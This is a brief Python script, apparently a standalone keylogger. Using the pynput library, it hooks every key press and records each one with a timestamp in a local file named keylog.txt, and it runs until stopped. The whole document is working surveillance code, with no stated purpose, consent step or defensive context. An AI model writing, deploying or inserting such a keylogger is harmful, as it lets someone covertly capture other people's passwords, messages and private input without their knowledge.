import pynput
from pynput.keyboard import Key, Listener
import logging

# Setup logging configuration
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

# Collect events until released
with Listener(on_press=on_press) as listener:
    listener.join()
